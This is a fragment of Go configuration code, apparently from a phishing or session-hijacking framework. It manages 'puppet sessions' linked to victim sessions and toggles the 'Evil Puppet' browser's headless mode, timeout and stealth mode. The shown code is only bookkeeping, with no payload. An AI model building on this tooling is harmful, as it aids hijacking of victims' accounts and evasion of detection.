	for _, s := range c.puppetSessions {
		if s.VictimSession == victimSession {
			sessions = append(sessions, s)
		}
	}
	return sessions
}

// CleanupPuppetSessions removes old puppet sessions
func (c *Config) CleanupPuppetSessions(maxAge time.Duration) int {
	cutoff := time.Now().Add(-maxAge)
	var remaining []*PuppetSession
	removed := 0
	
	for _, s := range c.puppetSessions {
		if s.StartedAt.After(cutoff) {
			remaining = append(remaining, s)
		} else {
			removed++
		}
	}
	
	if removed > 0 {
		c.puppetSessions = remaining
		c.SavePuppetSessions()
	}
	
	return removed
}

// SetPuppetBrowserHeadless sets browser headless mode
func (c *Config) SetPuppetBrowserHeadless(headless bool) {
	c.puppetConfig.Browser.Headless = headless
	c.SavePuppetConfig()
	if headless {
		log.Info("Evil Puppet browser set to headless mode")
	} else {
		log.Info("Evil Puppet browser set to visible mode (for debugging)")
	}
}

// SetPuppetBrowserTimeout sets browser timeout
func (c *Config) SetPuppetBrowserTimeout(timeout int) {
	if timeout < 10 || timeout > 300 {
		log.Error("timeout must be between 10 and 300 seconds")
		return
	}
	c.puppetConfig.Browser.Timeout = timeout
	c.SavePuppetConfig()
	log.Info("Evil Puppet browser timeout set to %d seconds", timeout)
}

// SetPuppetStealthEnabled enables/disables stealth mode
func (c *Config) SetPuppetStealthEnabled(enabled bool) {
	c.puppetConfig.Stealth.Enabled = enabled
	c.SavePuppetConfig()
	if enabled {
		log.Info("Evil Puppet stealth mode enabled")
	} else {
		log.Info("Evil Puppet stealth mode disabled")
	}
}